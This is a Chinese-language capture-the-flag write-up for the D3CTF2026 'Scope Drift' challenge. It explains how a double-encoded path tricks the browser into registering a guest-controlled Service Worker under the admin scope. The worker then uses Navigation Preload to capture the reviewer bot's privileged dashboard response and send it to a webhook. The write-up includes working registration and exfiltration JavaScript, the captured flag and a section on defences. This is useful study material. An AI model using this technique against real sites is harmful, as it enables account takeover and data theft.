# Scope Drift

## 题目简述

题目提供了一个简化的静态托管平台。访客可以把 HTML、JavaScript、CSS 或文本文件上传到 `/u/guest/`，再把其中一个页面提交给 reviewer bot。Bot 会先打开访客页面，短暂等待，然后继续访问受保护的 `/u/admin/dashboard`。访客还拥有 `/webhook/guest`，其请求记录可从 `/inbox` 查看。

动态观察到的关键接口如下：

| 接口 | 行为 |
|---|---|
| `POST /upload` | 接收 `path` 与 `content`，只允许访客命名空间 |
| `GET /u/guest/<file>` | 原样托管上传内容，JavaScript 可以执行 |
| `GET /bot?url=...` | 让 reviewer 依次访问访客页和管理员 dashboard |
| `GET /u/admin/dashboard` | 普通访客请求返回 `403 forbidden` |
| `/webhook/guest`、`/inbox` | 接收并展示页面回传的数据 |

题目的主要障碍不是普通存储型 XSS，而是 URL 多次解码造成的路径语义漂移。浏览器认为某个双重编码 URL 位于 `/u/admin/`，服务端却把它解析为 `/u/guest/` 下的攻击者文件。由此可以把访客控制的 Service Worker 注册到管理员作用域，再借助 Navigation Preload 读取 reviewer 的原始特权导航响应。

## 解题过程

### 1. 普通同源 XSS 为什么不够

上传的 HTML 没有 CSP 或 sandbox，可以直接执行脚本。最直观的做法是在 reviewer 打开访客页时请求管理员 dashboard：

```javascript
const response = await fetch("/u/admin/dashboard", {
  credentials: "include"
});
const body = await response.text();

await fetch("/webhook/guest", {
  method: "POST",
  headers: {"Content-Type": "application/x-www-form-urlencoded"},
  body: new URLSearchParams({
    status: String(response.status),
    body
  })
});
```

Inbox 中得到的结果却是：

```json
{
  "status": "403",
  "body": "forbidden"
}
```

这说明 reviewer 打开访客页时还不能用普通 `fetch` 读取管理员内容。管理员权限只在 bot 随后的 dashboard 顶层导航中生效，因此必须跨越页面切换并接管那一次导航。

### 2. Service Worker 的正常作用域限制

探针回调中的 `location` 还显示，bot 最终会把外部 review URL 映射为 `http://localhost:3000/u/guest/...`。因此 guest 页面与 dashboard 在 bot 中确实同源；同时 localhost 属于浏览器允许使用 Service Worker 的可信本地上下文，即使这里使用的是 HTTP，也不会因 secure-context 要求而禁用 Service Worker。

Service Worker 能在原页面离开后继续接管后续导航，很适合利用这里的两阶段 bot 流程。不过，直接把 `/u/guest/sw.js` 注册到 `/u/admin/` 会被 Chromium 拒绝：

```javascript
await navigator.serviceWorker.register("/u/guest/sw.js", {
  scope: "/u/admin/"
});
```

浏览器返回的核心错误为：

```text
The path of the provided scope ('/u/admin/') is not under the
max scope allowed ('/u/guest/').
```

在没有 `Service-Worker-Allowed` 响应头时，worker 的最大作用域默认不能越过其脚本所在目录。该规则可参见 [Service-Worker-Allowed 文档](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Service-Worker-Allowed)：若脚本位于 `/u/guest/`，正常情况下就不能控制 `/u/admin/`。

所以真正需要解决的是：让浏览器认为 worker 脚本位于 `/u/admin/`，同时让服务端返回 `/u/guest/` 中的可控 JavaScript。

### 3. 双重编码造成浏览器与服务端的路径分歧

先在访客目录上传一个普通脚本：

```text
/u/guest/scope-worker.js
```

随后请求下面两个别名，服务端都会返回同一份访客脚本：

```text
/u/admin/..%2fguest%2fscope-worker.js
/u/admin/..%252fguest%252fscope-worker.js
```

第二条路径是最终利用所需的形式。它在两端的理解不同：

```text
浏览器看到：
  /u/admin/..%252fguest%252fscope-worker.js
  └────────┘ └────────────────────────────┘
   脚本目录        一个不含真实 "/" 的路径段

服务端连续解码并规范化：
  ..%252fguest%252fscope-worker.js
       ↓ 第一次解码
  ..%2fguest%2fscope-worker.js
       ↓ 后续解码
  ../guest/scope-worker.js
       ↓ 路径规范化
  /u/guest/scope-worker.js
```

单编码的 `%2f` 不能直接用作 Service Worker 脚本 URL，因为浏览器会把编码的 `/` 或 `\` 视为危险路径分隔符并拒绝注册。双编码 `%252f` 在浏览器这一层只是编码后的 `%2f`，不会被当作实际斜杠；服务端却会继续解码，最终取到 guest 文件。

因此可以这样注册：

```javascript
await navigator.serviceWorker.register(
  "/u/admin/..%252fguest%252fscope-worker.js",
  {scope: "/u/admin/"}
);
await navigator.serviceWorker.ready;
```

浏览器认为脚本位于 `/u/admin/` 下，于是接受 `/u/admin/` 作用域；真正返回的脚本内容则完全由 guest 控制。

### 4. 为什么还需要 Navigation Preload

取得 `/u/admin/` 作用域后，worker 已经能够收到 dashboard 的 `fetch` 事件。最初直接转发请求：

```javascript
const response = await fetch(event.request);
```

得到的仍然是 `403`。这表明 bot 的管理员身份绑定在原始顶层导航请求的浏览器处理流程中；由 Service Worker 主动新建的网络请求没有复现该特权上下文。仅凭黑盒结果无法断言它具体是哪个私有头或浏览器侧机制，因此不应把实现细节写死为某一种凭据。

Navigation Preload 可以解决这个问题。启用后，浏览器在启动 worker 的同时并行发出原始导航请求；worker 再通过 `event.preloadResponse` 取得该请求的真实响应。W3C 的 [Service Worker 规范](https://w3c.github.io/ServiceWorker/)说明，preload 会克隆导航请求并把 service-workers mode 设为 `none`，从而直接访问网络；[MDN 的使用说明](https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API/Using_Service_Workers)也给出了在 `activate` 中启用、在 `fetch` 中读取 `preloadResponse` 的标准流程。

最终 worker 的核心代码如下：

```javascript
const exfiltrate = data => fetch("/webhook/guest", {
  method: "POST",
  headers: {"Content-Type": "application/x-www-form-urlencoded"},
  body: new URLSearchParams(data).toString(),
  credentials: "same-origin"
});

self.addEventListener("install", event => {
  event.waitUntil(self.skipWaiting());
});

self.addEventListener("activate", event => {
  event.waitUntil(Promise.all([
    self.clients.claim(),
    self.registration.navigationPreload.enable()
  ]));
});

self.addEventListener("fetch", event => {
  const url = new URL(event.request.url);
  if (url.pathname !== "/u/admin/dashboard") return;

  const task = (async () => {
    let response = await event.preloadResponse;
    if (!response) {
      response = await fetch(event.request);
    }

    const body = await response.clone().text();
    await exfiltrate({
      stage: "captured-dashboard",
      status: String(response.status),
      body
    });
    return response;
  })();

  event.respondWith(task);
  event.waitUntil(task.then(() => undefined));
});
```

这里有三个要点：

1. `skipWaiting()` 与 `clients.claim()` 尽快完成 worker 激活。
2. `event.preloadResponse` 读取 bot 原始 dashboard 导航的 `200` 响应，而不是重新构造一个得到 `403` 的请求。
3. 对响应使用 `clone()`，一份读取并回传，另一份继续交给 dashboard 导航，避免消耗原始响应体。

### 5. 自动化利用

目录中的 `solve.py` 会完成以下步骤：

1. 生成随机文件名和 marker，避免与其他解题者的文件或 inbox 记录冲突。
2. 把 worker 上传到 `/u/guest/`。
3. 访问双重编码 alias，确认它确实返回刚上传的 worker。
4. 上传注册页面并提交给 reviewer bot。
5. 按 marker 轮询 `/inbox`，从捕获的 dashboard HTML 中提取 flag。

按本机环境要求，可从 PowerShell 显式进入并退出 WSL 的 `ctf-tools` 环境：

```powershell
wsl bash -lc 'source /home/kali/miniforge3/etc/profile.d/conda.sh && conda activate ctf-tools && python "/mnt/d/文档/新建文件夹/D3CTF2026/Scope Drift/solve.py" "https://<challenge-origin>"; code=$?; conda deactivate; exit $code'
```

成功时的关键输出为：

```text
[+] worker alias verified: /u/admin/..%252fguest%252fscope-worker-....js
[+] bot response: admin bot finished
[+] dashboard status: 200
[+] response source: preload
[+] flag: d3ctf{S3Rvlc3_woRKER-scoPE_c0NfUSiON22a7be1}
```

最终 flag：

```text
d3ctf{S3Rvlc3_woRKER-scoPE_c0NfUSiON22a7be1}
```

### 6. 有价值的失败路径

- 普通同源 XSS：访客页中的 `fetch("/u/admin/dashboard")` 返回 403，说明权限尚未进入可复用的页面上下文。
- 直接扩大 guest worker 作用域：Chromium 根据脚本目录拒绝 `/u/admin/` scope。
- Worker 内 `fetch(event.request)`：成功拦截了 dashboard，却把特权导航降成 403；这一步证明必须保留原始导航，而不是简单重放请求。
- 弹窗观察 opener：自动弹窗被浏览器拦截，不能依赖额外窗口跨越 bot 的页面跳转。

## 方法总结

- 核心技巧：利用服务端重复 URL 解码与浏览器单层 URL 解析之间的差异，把 guest 控制的脚本伪装成 `/u/admin/` 下的 Service Worker，再用 Navigation Preload 读取原始特权导航响应。
- 识别信号：同源用户静态托管、管理员 bot 先访问用户页再访问敏感页、可上传 JavaScript、路径中存在编码分隔符差异，以及题目强调 `scope`、review workflow 或分阶段导航时，应优先检查 Service Worker 作用域接管。
- 关键区别：Service Worker 能“收到请求”不代表 `fetch(event.request)` 能复现原请求的全部特权语义。若重放结果与顶层导航不同，应检查 `event.preloadResponse`、导航模式、浏览器自动附加的请求上下文和一次性认证流程。
- 复用要点：路径测试必须区分浏览器解析、应用校验、静态文件查找和最终规范化分别执行了几次解码；不要只看单个 `../` 是否被拦截。给每一层使用不同内容的探针，才能证明别名实际指向哪一个文件。
- 防御方式：用户内容应放在独立 origin；鉴权与静态文件查找必须共享一次性、确定性的规范化结果；拒绝残留编码分隔符和多次解码后发生变化的路径；不要让低权限上传内容以高权限路径的 MIME 类型与作用域被浏览器加载。
